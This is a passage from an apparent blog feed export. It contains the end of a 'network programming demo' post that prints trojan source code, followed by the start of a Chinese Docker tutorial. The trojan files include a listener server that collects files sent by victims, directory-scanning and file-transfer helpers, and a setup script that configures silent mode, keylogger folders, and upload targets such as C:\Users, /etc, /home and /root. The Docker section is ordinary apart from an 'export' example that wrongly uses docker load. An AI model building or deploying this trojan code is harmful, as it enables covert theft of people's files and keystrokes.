blockID</span><br><span class="line">                block   = self.recv_data()</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(block, <span class="built_in">bytes</span>):</span><br><span class="line">                    <span class="keyword">raise</span> TypeError(<span class="string">&#x27;invalid type of block %s&#x27;</span> % <span class="built_in">type</span>(blockID))</span><br><span class="line">                <span class="keyword">if</span> <span class="built_in">len</span>(block) + totalSize &gt; self.maxSize:</span><br><span class="line">                    <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;exceed max file size limit&#x27;</span>)</span><br><span class="line">                fp.write(block)</span><br><span class="line">                self.send_data(blockID)</span><br><span class="line">        <span class="keyword">return</span> fileName</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">close</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.iHandle.close()</span><br><span class="line">        self.oHandle.close()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">save_file</span>(<span class="params">fileInfo, target</span>):</span></span><br><span class="line">    fileName = fileInfo.get(FILE_NAME_TAG)</span><br><span class="line">    fileSize = fileInfo.get(FILE_SIZE_TAG)</span><br><span class="line">    content  = fileInfo.get(FILE_CONTENT_TAG)</span><br><span class="line">    tempFile = fileInfo.get(FILE_BLOCKS_TAG)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fileName:</span><br><span class="line">        logging.debug(<span class="string">&#x27;invalid filename: %s&#x27;</span>, fileName)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> fileSize:</span><br><span class="line">        logging.debug(<span class="string">&#x27;invalid filename: %d&#x27;</span>, fileSize)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> content <span class="keyword">or</span> tempFile:</span><br><span class="line">        fullName = os.path.join(target, fileName)</span><br><span class="line">        dirname  = os.path.dirname(fullName)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(dirname):</span><br><span class="line">            os.makedirs(dirname)</span><br><span class="line">        <span class="keyword">if</span> content:</span><br><span class="line">            logging.debug(<span class="string">&#x27;save content&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(content) != fileSize:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;size unmatched&#x27;</span>)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(fullName, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">                fp.write(content)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            logging.debug(<span class="string">&#x27;save blocks from %s to %s&#x27;</span>, tempFile, fullName)</span><br><span class="line">            <span class="keyword">if</span> os.path.getsize(tempFile) != fileSize:</span><br><span class="line">                <span class="keyword">raise</span> RuntimeError(<span class="string">&#x27;size unmatched&#x27;</span>)</span><br><span class="line">            shutil.move(tempFile, fullName)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="path-py"><a href="#path-py" class="headerlink" title="path.py"></a>path.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> stat</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">split_path</span>(<span class="params">path</span>):</span></span><br><span class="line">    result = []</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        head, tail = os.path.split(path)</span><br><span class="line">        <span class="keyword">if</span> tail:</span><br><span class="line">            result.insert(<span class="number">0</span>, tail)</span><br><span class="line">            path = head</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            head = head.strip(<span class="string">&#x27;/:\\&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> head: result.insert(<span class="number">0</span>, head)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> result</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scan_dir</span>(<span class="params">path</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path, <span class="built_in">str</span>): <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):  <span class="keyword">return</span></span><br><span class="line">        st = os.stat(path)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span>(st.st_mode &amp; stat.S_IRUSR):</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(path):</span><br><span class="line">            fileList = os.listdir(path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">yield</span> path</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        logging.debug(<span class="string">&#x27;Exception: %s %s, abort&#x27;</span>, path, <span class="built_in">str</span>(e))</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> fileList:</span><br><span class="line">        fullpath = os.path.join(path, name)</span><br><span class="line">        <span class="keyword">yield</span> <span class="keyword">from</span> scan_dir(fullpath)  <span class="comment"># Python3</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    <span class="built_in">print</span>(split_path(<span class="string">&#x27;/home/trojan/source_code/server.py&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="server-py"><a href="#server-py" class="headerlink" title="server.py"></a>server.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> platform</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">from</span> config <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> common <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> inout  <span class="keyword">import</span> InOutException</span><br><span class="line"><span class="keyword">from</span> netapi <span class="keyword">import</span> NetAPI, save_file</span><br><span class="line"></span><br><span class="line"><span class="comment">### change banner here ###</span></span><br><span class="line">BANNER  = <span class="string">b&#x27;7RJN0001 7r0j4n 53rv3r v.0.1 r313453\r\n&#x27;</span></span><br><span class="line">BANNER += <span class="string">b&#x27;********************************\r\n&#x27;</span></span><br><span class="line">BANNER += <span class="string">b&#x27;*** W31c0m3 70 53nd m3 f!135 ***\r\n&#x27;</span></span><br><span class="line">BANNER += <span class="string">b&#x27;********************************\r\n&#x27;</span></span><br><span class="line"><span class="comment">##########################</span></span><br><span class="line"></span><br><span class="line">MAX_CONN = <span class="number">10</span></span><br><span class="line">target_dir = save_dir.get(platform.system())</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">receive_thread</span>(<span class="params">conn, addr, path</span>):</span></span><br><span class="line">    handler     = NetAPI(conn)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            logging.debug(<span class="string">&#x27;start recv_file()&#x27;</span>)</span><br><span class="line">            data    = handler.recv_file()</span><br><span class="line">            logging.debug(<span class="string">&#x27;return from recv_file()&#x27;</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                logging.debug(<span class="string">&#x27;receive_thread: no data, break&#x27;</span>)</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            logging.debug(<span class="string">&#x27;verify data&#x27;</span>)</span><br><span class="line">            data    = handler.recv_verify(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">                logging.debug(<span class="string">&#x27;data imcomplete&#x27;</span>)</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            filename = os.path.join(path, addr[<span class="number">0</span>])</span><br><span class="line">            logging.debug(<span class="string">&#x27;save to %s&#x27;</span>, filename)</span><br><span class="line">            save_file(data, filename)</span><br><span class="line">        <span class="keyword">except</span> InOutException <span class="keyword">as</span> e:</span><br><span class="line">            logging.debug(<span class="string">&#x27;receive_thread: got exception %s&#x27;</span>, e.args)</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> e:</span><br><span class="line">            logging.debug(<span class="string">&#x27;receive_thread: got exception %s, break&#x27;</span>, e.args)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            logging.debug(<span class="string">&#x27;receive_thread: got exception: %s, break&#x27;</span>, <span class="built_in">str</span>(e))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    logging.debug(<span class="string">&#x27;close connection&#x27;</span>)</span><br><span class="line">    conn.close()</span><br><span class="line"></span><br><span class="line"><span class="comment">################</span></span><br><span class="line"><span class="comment"># server start #</span></span><br><span class="line"><span class="comment">################</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">server_start</span>(<span class="params">addr</span>):</span></span><br><span class="line">    thread_flag  = <span class="literal">True</span>  <span class="comment"># False if debugging</span></span><br><span class="line">    threads      = []</span><br><span class="line">    serverSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">    serverSocket.bind(addr)</span><br><span class="line">    serverSocket.listen(<span class="number">5</span>)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        conn, addr  = serverSocket.accept()</span><br><span class="line">        logging.debug(<span class="string">&#x27;send banner&#x27;</span>)</span><br><span class="line">        conn.send(BANNER + <span class="string">b&#x27;\0&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> thread_flag:</span><br><span class="line">            <span class="comment"># thread</span></span><br><span class="line">            threads = thread_refresh(threads)</span><br><span class="line">            <span class="keyword">if</span> <span class="built_in">len</span>(threads) &lt; MAX_CONN:</span><br><span class="line">                thread = threading.Thread(target=receive_thread, \</span><br><span class="line">                                          args=(conn, addr, target_dir,))</span><br><span class="line">                thread.start()</span><br><span class="line">                threads.append(thread)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                conn.close()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            receive_thread(conn, addr, target_dir)</span><br><span class="line">    serverSocket.close()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server_start((<span class="string">&#x27;&#x27;</span>, PORT, ))</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h2 id="setup-py"><a href="#setup-py" class="headerlink" title="setup.py"></a>setup.py</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> myip</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">build_config</span>(<span class="params">fileName, parameters</span>):</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(fileName, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> fp:</span><br><span class="line">        maxlen = <span class="built_in">max</span>([<span class="built_in">len</span>(x) <span class="keyword">for</span> x <span class="keyword">in</span> parameters.keys()])</span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> parameters.items():</span><br><span class="line">            fp.write(<span class="string">&#x27;%s = %s\n&#x27;</span> % (key.ljust(maxlen), <span class="built_in">str</span>(value)))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parameters = &#123;</span><br><span class="line">            <span class="string">&#x27;MAX_BANNER_LEN&#x27;</span>:  <span class="number">1024</span>,</span><br><span class="line">            <span class="string">&#x27;SILENT_MODE&#x27;</span>:     <span class="literal">True</span>,</span><br><span class="line">            <span class="string">&#x27;SERVERS&#x27;</span>:         [myip.myip_wan(), myip.myip_lan()],</span><br><span class="line">            <span class="string">&#x27;PORT&#x27;</span>:            <span class="number">50006</span>,</span><br><span class="line">            <span class="string">&#x27;trojan_dirs&#x27;</span>:     &#123; <span class="string">&#x27;Windows&#x27;</span>: <span class="string">&#x27;C:\\Trojan&#x27;</span>,</span><br><span class="line">                                 <span class="string">&#x27;Linux&#x27;</span>:   <span class="string">&#x27;/tmp&#x27;</span>, &#125;,</span><br><span class="line">            <span class="string">&#x27;keylogger_dirs&#x27;</span>:  &#123; <span class="string">&#x27;Windows&#x27;</span>: [<span class="string">&#x27;C:\\KeyLogger&#x27;</span>], &#125;,</span><br><span class="line">            <span class="string">&#x27;upload_dirs&#x27;</span>:     &#123; <span class="string">&#x27;Windows&#x27;</span>: [<span class="string">&#x27;C:\\Users&#x27;</span>, <span class="string">&#x27;D:&#x27;</span>, <span class="string">&#x27;E:&#x27;</span>, <span class="string">&#x27;F:&#x27;</span>],</span><br><span class="line">                                 <span class="string">&#x27;Linux&#x27;</span>:   [<span class="string">&#x27;/etc&#x27;</span>, <span class="string">&#x27;/home&#x27;</span>, <span class="string">&#x27;/root&#x27;</span>],&#125;,</span><br><span class="line">            <span class="string">&#x27;max_size&#x27;</span>:        <span class="number">16</span> * <span class="number">1024</span> * <span class="number">1024</span>,</span><br><span class="line">            <span class="string">&#x27;max_file&#x27;</span>:        <span class="number">0</span>,</span><br><span class="line">            <span class="string">&#x27;update_interval&#x27;</span>: <span class="number">60</span> * <span class="number">60</span>,   <span class="comment"># seconds</span></span><br><span class="line">            <span class="string">&#x27;keylog_interval&#x27;</span>: <span class="number">3</span>,</span><br><span class="line">            <span class="string">&#x27;save_dir&#x27;</span>:        &#123;<span class="string">&#x27;Windows&#x27;</span>: <span class="string">&#x27;C:\\temp&#x27;</span>,</span><br><span class="line">                                <span class="string">&#x27;Linux&#x27;</span>:   <span class="string">&#x27;/tmp&#x27;</span>, &#125;</span><br><span class="line">            &#125;</span><br><span class="line">    dirName  = os.path.dirname(os.path.abspath(__file__))</span><br><span class="line">    fileName = os.path.join(dirName, <span class="string">&#x27;config.py&#x27;</span>)</span><br><span class="line">    build_config(fileName, parameters)</span><br><span class="line"></span><br></pre></td></tr></table></figure>











]]></content>
      <categories>
        <category>网络编程</category>
      </categories>
      <tags>
        <tag>demo</tag>
      </tags>
  </entry>
  <entry>
    <title>Docker 技术整理</title>
    <url>//Docker-summary</url>
    <content><![CDATA[<h2 id="一、概述"><a href="#一、概述" class="headerlink" title="一、概述"></a>一、概述</h2><h3 id="1-1-什么是docker"><a href="#1-1-什么是docker" class="headerlink" title="1.1 什么是docker"></a>1.1 什么是docker</h3><p>Docker 诞生于 2013 年初，由 dotCloud 公司（后改名为 Docker Inc）基于 Go 语言实现并开源的项目。此项目后来加入 Linux基金会，遵从了 Apache 2.0 协议</p>
<p>Docker 项目的目标是实现轻量级的操作系统虚拟化解决方案。Docker 是在 Linux 容器技术（LXC）的基础上进行了封装，让用户可以快速并可靠的将应用程序从一台运行到另一台上。</p>
<p>使用容器部署应用被称为<strong>容器化</strong>，容器化技术的几大优势：</p>
<ol>
<li><strong>灵活</strong>：甚至复杂的应用也可以被容器化</li>
<li><strong>轻量</strong>：容器利用和共享宿主机内核，从而在利用系统资源比虚拟机更加的有效</li>
<li><strong>可移植</strong>：你可以在本地构建，在云端部署并在任何地方运行</li>
<li><strong>松耦合</strong>：容器是高度封装和自给自足的，允许你在不破环其他容器的情况下替换或升级任何一个</li>
<li><strong>可扩展</strong>：你可以通过数据中心来新增和自动分发容器</li>
<li><strong>安全</strong>：容器依赖强约束和独立的进程</li>
</ol>
<h3 id="1-2-和传统虚拟机的区别"><a href="#1-2-和传统虚拟机的区别" class="headerlink" title="1.2 和传统虚拟机的区别"></a>1.2 和传统虚拟机的区别</h3><p>容器在Linux上本地运行，并与其他容器共享主机的内核。它运行一个离散进程，不占用任何其他可执行文件更多的内存，从而使其轻巧。</p>
<p><img src="https://cdn.nlark.com/yuque/0/2020/png/93990/1598693996043-1d7fecba-79fd-489c-b933-2d23c37680a8.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/93990/1598693996043-1d7fecba-79fd-489c-b933-2d23c37680a8.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p>
<h3 id="1-3-相关链接"><a href="#1-3-相关链接" class="headerlink" title="1.3 相关链接"></a>1.3 相关链接</h3><p>官网：<a href="https://www.docker.com/">https://www.docker.com/</a></p>
<p>文档：<a href="https://docs.docker.com/">https://docs.docker.com/</a></p>
<h2 id="二、Image镜像"><a href="#二、Image镜像" class="headerlink" title="二、Image镜像"></a>二、Image镜像</h2><h3 id="2-1-介绍"><a href="#2-1-介绍" class="headerlink" title="2.1 介绍"></a>2.1 介绍</h3><p>Docker 镜像是一个特殊的文件系统，除了提供容器运行时所需的程序、库、资源、配置等文件外，还包含了一些为运行时准备的一些配置参数（如匿名卷、环境变量、用户等）。镜像不包含任何动态数据，其内容在构建之后也<strong>不会被改变</strong>。</p>
<ol>
<li><strong>父镜像</strong>：每个镜像都可能依赖于有一个或多个下层组成的另一个镜像。下层那个镜像就是上层镜像的父镜像</li>
<li><strong>基础镜像</strong>：一个没有任何父镜像的镜像，被称为基础镜像</li>
<li><strong>镜像ID</strong>：所有镜像都是通过一个 64 位十六进制字符串（256 bit 的值）来标识的。为了简化使用，前 12 个自负可以组成一个短ID，可以在命令行中使用。短ID还是有一定的碰撞几率，所以服务器总是返回长ID</li>
</ol>
<h3 id="2-2-从仓库下载镜像"><a href="#2-2-从仓库下载镜像" class="headerlink" title="2.2 从仓库下载镜像"></a>2.2 从仓库下载镜像</h3><p>可以通过 <code>docker pull</code> 命令从仓库获取所需要的镜像</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull [选项] [Docker Registry 地址]&lt;镜像名&gt;:&lt;标签&gt;</span><br></pre></td></tr></table></figure>

<p><strong>选项:</strong></p>
<ol>
<li> –all-tags,-a : 拉去所有 tagged 镜像</li>
<li>–disable-content-trust：忽略镜像的校验，默认</li>
<li>–platform：如果服务器是开启多平台支持的，则需要设置平台</li>
<li>–quiet,-q：静默执行，不打印详细信息</li>
</ol>
<p>标签： 下载指定标签的镜像，默认 <code>latest</code></p>
<p><strong>示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 从 Docker Hub 下载最新的 debian 镜像</span><br><span class="line">docker pull debian</span><br><span class="line"></span><br><span class="line"># 从 Docker Hub 下载 jessie 版 debian 镜像</span><br><span class="line">docker pull debian:jessie</span><br><span class="line"></span><br><span class="line"># 下载指定摘要(sha256)的镜像</span><br><span class="line">docker pull ubuntu@sha256:45b23dee08af5e43a7fea6c4cf9c25ccf269ee113168c19722f87876677c5cb2</span><br></pre></td></tr></table></figure>

<h3 id="2-3-列出本地镜像"><a href="#2-3-列出本地镜像" class="headerlink" title="2.3 列出本地镜像"></a>2.3 列出本地镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 列出已下载的镜像 image_name: 指定列出某个镜像</span><br><span class="line">docker images [选项] [image_name]</span><br></pre></td></tr></table></figure>

<p><strong>选项</strong></p>
<table>
<thead>
<tr>
<th>参数</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>–all, -a</td>
<td>展示所有镜像(包括 intermediate 镜像)</td>
</tr>
<tr>
<td>–digests</td>
<td>展示摘要</td>
</tr>
<tr>
<td>–filter, -f</td>
<td>添加过滤条件</td>
</tr>
<tr>
<td>–format</td>
<td>使用 Go 模版更好的展示</td>
</tr>
<tr>
<td>–no-trunc</td>
<td>不删减输出</td>
</tr>
<tr>
<td>–quiet, -q</td>
<td>静默输出，仅仅展示 IDs</td>
</tr>
</tbody></table>
<p><strong>示例</strong></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 展示本地所有下载的镜像</span><br><span class="line">docker images</span><br><span class="line"></span><br><span class="line"># 在本地查找镜像名是 &quot;java&quot; 标签是 &quot;8&quot; 的 奖项</span><br><span class="line">docker images: java:8</span><br><span class="line"></span><br><span class="line"># 查找悬挂镜像</span><br><span class="line">docker images --filter &quot;dangling=true&quot;</span><br><span class="line"></span><br><span class="line"># 过滤 lable 为 &quot;com.example.version&quot; 的值为 0.1 的镜像</span><br><span class="line">docker images --filter &quot;label=com.example.version=0.1&quot;</span><br></pre></td></tr></table></figure>



<h3 id="2-4-Dockerfile创建镜像"><a href="#2-4-Dockerfile创建镜像" class="headerlink" title="2.4 Dockerfile创建镜像"></a>2.4 Dockerfile创建镜像</h3><p>为了方便分享和快速部署，我们可以使用 <code>docker build</code> 来创建一个新的镜像，首先创建一个文件 Dockerfile，如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># This is a comment</span><br><span class="line">FROM ubuntu:14.04</span><br><span class="line">MAINTAINER Chris &lt;jaytp@qq.com&gt;</span><br><span class="line">RUN apt-get -qq update</span><br><span class="line">RUN apt-get -qqy install ruby ruby-dev</span><br><span class="line">RUN gem install sinatra</span><br></pre></td></tr></table></figure>

<p>然后在此 Dockerfile 所在目录执行 <code>docker build -t yelog/ubuntu:v1 .</code> 来生成镜像，所属组织/镜像名:标签</p>
<h3 id="2-5-上传镜像"><a href="#2-5-上传镜像" class="headerlink" title="2.5 上传镜像"></a>2.5 上传镜像</h3><p>用户可以通过 <code>docker push</code> 命令，把自己创建的镜像上传到仓库中来共享。例如，用户在 Docker Hub 上完成注册后，可以推送自己的镜像到仓库中。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker push yelog/ubuntu</span><br></pre></td></tr></table></figure>

<h3 id="2-6-导出和载入镜像"><a href="#2-6-导出和载入镜像" class="headerlink" title="2.6 导出和载入镜像"></a>2.6 导出和载入镜像</h3><p>docker 支持将镜像导出为文件，然后可以再从文件导入到本地镜像仓库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 导出</span><br><span class="line">docker load --input yelog_ubuntu_v1.tar</span><br><span class="line"># 载入</span><br><span class="line">docker load &lt; yelog_ubuntu_v1.tar</span><br></pre></td></tr></table></figure>

<h3 id="2-7-移除本地镜像"><a href="#2-7-移除本地镜像" class="headerlink" title="2.7 移除本地镜像"></a>2.7 移除本地镜像</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># -f 强制删除</span><br><span class="line">docker rmi [-f] yelog/ubuntu:v1</span><br><span class="line"># 删除悬挂镜像</span><br><span class="line">docker rmi $(docker images -f &quot;dangling=true&quot; -q)</span><br><span class="line"># 删除所有未被容器使用的镜像</span><br><span class="line">docker image prune -a</span><br></pre></td></tr></table></figure>



<h2 id="三、容器"><a href="#三、容器" class="headerlink" title="三、容器"></a>三、容器</h2><h3 id="3-1-介绍"><a href="#3-1-介绍" class="headerlink" title="3.1 介绍"></a>3.1 介绍</h3><p>容器和镜像，就像面向对象中的 <strong>类</strong> 和 <strong>示例</strong> 一样，镜像是静态的定义，容器是镜像运行的实体，容器可以被创建、启动、停止、删除和暂停等</p>
<p>容器的实质是进城，耽于直接的宿主执行的进程不同，容器进程运行于属于自己的独立的命名空间。因此容器可以拥有自己的 root 文件系统、网络配置和进程空间，甚至自己的用户 ID 空间。容器内的进程是运行在一个隔离的环境里，使用起来，就好像是在一个独立于宿主的系统下一样。这种特性使得容器封装的应用比直接在宿主运行更加安全。</p>
<h3 id="3-2-创建容器"><a href="#3-2-创建容器" class="headerlink" title="3.2 创建容器"></a>3.2 创建容器</h3><p>我们可以通过命令 <code>docker run</code> 命令创建容器</p>
<p>如下，启动一个容器，执行命令输出 “Hello word”，之后终止容器</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run ubuntu:14.04 /bin/echo &#x27;Hello world&#x27;</span><br></pre></td></tr></table></figure>

<p>下面的命令则是启动一个 bash 终端，允许用户进行交互</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -t -i ubuntu:14.04 /bin/bash</span><br></pre></td></tr></table></figure>

<p><code>-t</code> 让 Dcoker 分配一个伪终端（pseudo-tty）并绑定到容器的标准输入上</p>
<p><code>-i</code> 责让容器的标准输入保持打开</p>
<p>更多参数可选</p>
<table>
<thead>
<tr>
<th>-a stdin</th>
<th>指定标准输入输出内容类型</th>
</tr>
</thead>
<tbody><tr>
<td>-d</td>
<td>后台运行容器，并返回容器ID</td>
</tr>
<tr>
<td>-i</td>
<td>以交互模式运行容器，通常与 -t 同时使用</td>
</tr>
<tr>
<td>-P</td>
<td>随机端口映射，容器端口内部随即映射到宿主机的端口上</td>
</tr>
<tr>
<td>-p</td>
<td>指定端口映射， -p 宿主机端口:容器端口</td>
</tr>
<tr>
<td>-t</td>
<td>为容器重新分配一个伪输入终，通常与 -i 同时使用</td>
</tr>
<tr>
<td>–name=”gate”</td>
<td>为容器指定一个名称</td>
</tr>
<tr>
<td>–dns 8.8.8.8</td>
<td>指定容器的 DNS 服务器，默认与宿主机一致</td>
</tr>
<tr>
<td>–dns-search example.com</td>
<td>指定容器 DNS 搜索域名，默认与宿主机一致</td>
</tr>
<tr>
<td>-h “gate”</td>
<td>指定容器的 hostname</td>
</tr>
<tr>
<td>-e username=’gate’</td>
<td>设置环境变量</td>
</tr>
<tr>
<td>–env-file=[]</td>
<td>从指定文件读入环境变量</td>
</tr>
<tr>
<td>–cpuset=”0-2” or –cpuset=”0,1,2”</td>
<td>绑定容器到指定 CPU 运行</td>
</tr>
<tr>
<td>-m</td>
<td>设置容器使用内存最大值</td>
</tr>
<tr>
<td>–net=”bridge”</td>
<td>指定容器的网络连接类型支持 bridge/host/none/container</td>
</tr>
<tr>
<td>–link=[]</td>
<td>添加链接到另一个容器</td>
</tr>
<tr>
<td>–expose=[]</td>
<td>开放一个端口或一组端口</td>
</tr>
<tr>
<td>–volume,-v</td>
<td>绑定一个卷</td>
</tr>
</tbody></table>
<p>当利用 <code>docker run</code> 来创建容器时，Dcoker 在后台运行的标准操作包括：</p>
<ul>
<li>检查本地是否存在指定的镜像，不存在就从公有仓库下载</li>
<li>利用镜像创建并启动一个容器</li>
<li>分配一个文件系统，并在只读的镜像外面挂在一层可读写层</li>
<li>从宿主主机配置的网桥接口中桥接一个虚拟借口到容器中去</li>
<li>从地址池配置一个 ip 地址给容器</li>
<li>执行用户指定的应用程序</li>
<li>执行用户指定的应用程序</li>
<li>执行完毕后容器被终止</li>
</ul>
<h3 id="3-3-启动容器"><a href="#3-3-启动容器" class="headerlink" title="3.3 启动容器"></a>3.3 启动容器</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建一个名为 test 的容器，容器任务是：打印一行 Hello word</span><br><span class="line">docker run --name=&#x27;test&#x27; ubuntu:14.04 /bin/echo &#x27;Hello world&#x27;</span><br><span class="line"># 查看所有可用容器 [-a]包括终止在内的所有容器</span><br><span class="line">docker ps -a</span><br><span class="line"># 启动指定 name 的容器</span><br><span class="line">docker start test</span><br><span class="line"># 重启指定 name 的容器</span><br><span class="line">docker restart test</span><br><span class="line"># 查看日志运行日志（每次启动的日志均被查询出来）</span><br><span class="line">$ docker logs test</span><br><span class="line">Hello world</span><br><span class="line">Hello world</span><br></pre></td></tr></table></figure>

<h3 id="3-4-守护态运行"><a href="#3-4-守护态运行" class="headerlink" title="3.4 守护态运行"></a>3.4 守护态运行</h3><p>前面创建的容器都是执行任务（打印Hello world）后，容器就终止了。更多的时候，我们需要让 Docker 容器在后台以守护态（Daemonized）形式运行。此时，可以通过添加 <code>-d</code> 参数来实现</p>
<blockquote>
<p>注意：docker是否会长久运行，和 docker run 指定的命令有关</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 创建 docker 后台守护进程的容器</span><br><span class="line">docker run --name=&#x27;test2&#x27; -d ubuntu:14.04 /bin/sh -c &quot;while true; do echo hello world; sleep 1; done&quot;</span><br><span class="line"></span><br><span class="line"># 查看容器</span><br><span class="line">$ docker ps</span><br><span class="line">CONTAINER ID        IMAGE               COMMAND                  CREATED             STATUS              PORTS                               NAMES</span><br><span class="line">237e555d4457        ubuntu:14.04        &quot;/bin/sh -c &#x27;while t…&quot;   52 seconds ago      Up 51 seconds                                           test2</span><br><span class="line"></span><br><span class="line"># 获取容器的输出信息</span><br><span class="line">$ docker logs test2</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br><span class="line">hello world</span><br></pre></td></tr></table></figure>

<h3 id="3-5-进入容器"><a href="#3-5-进入容器" class="headerlink" title="3.5 进入容器"></a>3.5 进入容器</h3><p>上一步我们已经实现了容器守护态长久运行，某些时候需要进入容器进行操作，可以使用 <code>attach</code> 、<code>exec</code> 进入容器。</p>
